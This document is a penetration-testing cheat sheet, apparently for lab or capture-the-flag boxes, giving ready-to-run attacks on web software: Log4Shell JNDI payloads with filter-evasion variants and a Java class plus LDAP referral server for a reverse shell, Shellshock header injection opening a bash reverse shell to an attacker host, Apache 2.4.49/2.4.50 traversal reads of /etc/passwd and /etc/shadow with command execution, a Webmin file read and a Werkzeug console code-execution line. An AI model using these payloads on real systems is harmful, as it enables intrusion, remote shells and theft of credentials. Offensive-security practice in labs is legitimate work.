# Web CVEs: Log4Shell, Shellshock and others

## Before any public exploit
searchsploit THE-APP THE-VERSION
searchsploit -m <EdbID>
- [ ] Read it first: the target path, the callback IP and port, Python 2 or 3, the modules it needs
- [ ] Listener first, exploit second

## Log4Shell: does it look things up
Java behind it, Log4j 2 before 2.15.0: Solr, VMware, Minecraft, custom apps. Anything it logs can carry the string.
nc -lvnp 1389
curl -sk <Scheme>://<WebHost>/ -H 'User-Agent: ${jndi:ldap://<LHOST>:1389/x}'
curl -sk <Scheme>://<WebHost>/ -H 'X-Api-Version: ${jndi:ldap://<LHOST>:1389/x}'
curl -sk -G '<Scheme>://<WebHost>/THE-PAGE' --data-urlencode '<Param>=${jndi:ldap://<LHOST>:1389/x}'
- [ ] Also login usernames, search boxes and Solr's /solr/admin/cores?foo=
- [ ] Any connection on 1389: it does the lookup
- [ ] A filter on jndi: ${${lower:j}ndi:ldap://<LHOST>:1389/x} or ${${::-j}${::-n}${::-d}${::-i}:ldap://<LHOST>:1389/x}

## Log4Shell: a shell
The class it will load:
cat > Exploit.java <<'EOF'
public class Exploit { static { try { Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"}); } catch (Exception e) {} } }
EOF
javac --release 8 Exploit.java
python3 -m http.server 8000
An LDAP server that refers the lookup to that class, built once:
git clone https://github.com/mbechler/marshalsec ~/marshalsec
sudo apt install -y maven
cd ~/marshalsec && mvn clean package -DskipTests && cd -
java -cp ~/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://<LHOST>:8000/#Exploit'
rlwrap nc -lvnp <LPORT>
The same request as before, with /Exploit at the end:
curl -sk <Scheme>://<WebHost>/ -H 'User-Agent: ${jndi:ldap://<LHOST>:1389/Exploit}'
- [ ] The lookup lands but no class is fetched: Java 8u191 or later, which needs a gadget already on the target's classpath

## Shellshock: find a CGI script
- [ ] /cgi-bin/ can answer 403 while its scripts still run
feroxbuster -u <Scheme>://<WebHost>/cgi-bin/ -k -n -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x sh,cgi,pl

## Shellshock: run a command
The first echo ends the headers, so the output lands in the body. Full paths, since the CGI may have no PATH.
curl -sk -A '() { :;}; echo; /usr/bin/id' <Scheme>://<WebHost>/cgi-bin/THE-SCRIPT
sudo nmap -p <Port> --script http-shellshock --script-args uri=/cgi-bin/THE-SCRIPT <TargetIP>
rlwrap nc -lvnp <LPORT>
curl -sk -A "() { :;}; /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" <Scheme>://<WebHost>/cgi-bin/THE-SCRIPT
- [ ] User-Agent filtered: Referer, Cookie or any other header

## Apache 2.4.49 and 2.4.50
A file read on 2.4.49, CVE-2021-41773:
curl -sk --path-as-is '<Scheme>://<WebHost>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
A command, when CGI is on:
curl -sk --path-as-is -d 'echo Content-Type: text/plain; echo; id' '<Scheme>://<WebHost>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
On 2.4.50, CVE-2021-42013, double-encoded:
curl -sk --path-as-is '<Scheme>://<WebHost>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
curl -sk --path-as-is -d 'echo Content-Type: text/plain; echo; id' '<Scheme>://<WebHost>/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'

## Webmin, on 10000
- [ ] The web host filled in with Webmin's own port, 10000, usually over https
- [ ] 1.890 to 1.920: the backdoor, CVE-2019-15107, with Metasploit's exploit/linux/http/webmin_backdoor
- [ ] Before 1.290: a file read with no login, CVE-2006-3392
curl -sk '<Scheme>://<WebHost>/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow'

## Werkzeug debug console
curl -skI <Scheme>://<WebHost>/ | grep -i server
curl -sk <Scheme>://<WebHost>/console | grep -io 'console is locked\|EVALEX'
- [ ] No PIN: the console runs Python as it is
__import__('os').popen('id').read()
- [ ] A PIN: computed from the user, the app's path, the MAC address and the machine ID, read through an LFI
- [ ] Editing auth false to true in Burp does not unlock it: the server checks the PIN

## Others seen on boxes
- [ ] phpLiteAdmin 1.9.3, password admin: a database named x.php, a TEXT column whose default is PHP code, then the file included through an LFI
- [ ] PHP-Fusion 9.03.50, often only on localhost: ss -lntp on the target, a forward, then searchsploit php-fusion 9.03
- [ ] Advanced Comment System 1.0: command execution with no login, searchsploit advanced comment system
- [ ] Old IIS: 8.3 short names give the first six letters of hidden files
sudo nmap -p <Port> --script http-iis-short-name-brute <TargetIP>
